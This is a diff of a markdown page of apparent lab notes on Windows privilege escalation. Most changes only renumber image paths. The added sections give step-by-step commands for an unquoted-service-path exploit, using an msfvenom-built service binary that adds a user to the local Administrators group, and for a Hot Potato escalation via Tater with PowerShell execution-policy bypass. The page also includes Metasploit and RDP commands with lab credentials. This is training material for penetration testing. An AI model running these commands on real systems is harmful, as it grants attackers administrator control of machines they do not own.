@@ -184,7 +184,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Aut
 
 5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -255,7 +255,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 
 1\. Wait for a new session to open in Metasploit.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
 3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid
@@ -278,7 +278,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2.From the output, notice that “AlwaysInstallElevated” value is 1.\
 3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
@@ -289,7 +289,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 4.From the output, notice that “AlwaysInstallElevated” value is 1.
 
@@ -371,7 +371,7 @@ sessions -i 1
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Registry
 
@@ -607,7 +607,7 @@ sc start filepermsvc
 net localgroup administrators
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation - Startup Applications
 
@@ -693,7 +693,7 @@ xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568 /
 getuid
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - DLL Hijacking
 
@@ -713,7 +713,7 @@ getuid
 5\. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.\
 
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 6\. Next, select from the left-most drop down menu ‘Result’.\
 
@@ -826,7 +826,7 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 
 2\. Notice that the output suggests that the user “User-PC\User” has the “SERVICE\_CHANGE\_CONFIG” permission.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -858,7 +858,7 @@ sc start daclsvc
 net localgroup administrators
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Escalation - Unquoted Service Paths
 
@@ -919,19 +919,104 @@ net localgroup administrators
 
 <figure><img src="../../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>
 
+## Service Escalation - Unquoted Service Paths
+
+### Detection
+
+1\. Open command prompt and type: sc qc unquotedsvc
+
+**Victim**
+
+```
+sc qc unquotedsvc
+```
+
+\
+2\. Notice that the “BINARY\_PATH\_NAME” field displays a path that is not confined between quotes.
+
+### Exploitation
+
+1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+
+**Kali**
+
+```
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+```
+
+\
+2\. Copy the generated file, common.exe, to the Windows VM.
+
+**Victim**
+
+```
+copy \\tsclient\kali\common.exe  "C:\Program Files\Unquoted Path Service\common.exe"
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
 
+Windows VM
 
+1\. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.\
+2\. Open command prompt and type: sc start unquotedsvc
 
+**Victim**
 
+```
+sc start unquotedsvc
+```
 
+\
+3\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
 
+**Victim**
 
+```
+net localgroup administrators
+```
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
+## Potato Escalation - Hot Potato
 
+### Exploitation
 
+1\. In command prompt type: powershell.exe -nop -ep bypass
+
+**Victim**
+
+```
+powershell.exe -nop -ep bypass
+```
+
+\
+2\. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+
+**Victim(Powershell)**
+
+```
+Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+```
+
+\
+3\. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+
+**Victim(Powershell)**
+
+```
+Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+```
+
+\
+4\. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
+
+**Victim**
+
+```
+net localgroup administrators
+```
 
 
 
